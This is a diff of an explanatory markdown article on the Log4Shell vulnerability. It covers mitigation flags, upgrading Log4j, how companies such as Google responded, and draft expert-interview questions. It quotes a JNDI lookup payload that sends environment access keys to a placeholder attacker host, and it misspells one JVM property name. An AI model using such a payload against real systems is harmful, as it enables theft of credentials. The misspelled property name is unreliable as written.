@@ -42,7 +42,7 @@ According to [this source](https://www.npr.org/2021/12/14/1064123144/companies-s
 
 
 ## What are the potential fixes for severe vulnerabilities like Log4Shell?
-First of all, the are some simple mitigations which can stop some of the damage being done to your application. The first one is to disable lookups by setting the following flags to false.
+First of all, there are some simple mitigations which can stop some of the damage being done to your application. The first one is to disable lookups by setting the following flags to false.
 ```
 com.sun.jndi.ldap.object.trustURLCodebase
 com.sun.jdni.rmi.object.trustURLCodebase
@@ -51,18 +51,25 @@ This however won't stop your application from actually making the call. It only 
 ```java
 ${jndi:ldap://attackerip/exploit/${env:ACCES_KEY_ID}/${env:SECRET_ACCES_KEY}}
 ```
+You could also disable Log4j, which obviously isn't a very good temporary solution. 
 A more definitive way of fixing the vulnerability is to  update log4j to version 2.16 or above. This can be rather difficult, since an application can have dependencies on things, which then have dependencies on Log4j. You would either have to wait for that dependency to publish an update, or if you're using gradle, you could use a function called dependency constraints.
 Another way that some companies used to fix it is to directly patch it. Which may be the eassiest option in some cases.
 
-
-
-
-
 ![image](https://user-images.githubusercontent.com/77112006/147350117-701b817a-cda4-412c-b85e-89865f4fa72d.png)
 
-## How did affected developers deal with it?
+## How did affected developers deal with this situation?
 After the news of this exploit was made public, virtually every tech companies number one priotity was to find a way to fix it within their software, before any hacker could exploit it. The Washington post stated 
 > At Google alone, more than 500 engineers had been going through reams and reams of code to make sure it was safe, according to one employee.
+
+(expert interview)
+
+- In what way did you get effected by the Log4j vulnerability?
+- How did you receive the first signs that something regarding security was wrong?
+- Did you have any type of protocols to follow in case of an emergency like this? If not, do you have them now?
+- What was the first things you did after you were notified of the Log4j vulnerability?
+- Did you notice any unusual amounts of stress in yourself of your coworkers while this situation unfolded?
+- What steps were taken to resolve the issue?
+
 
 
 
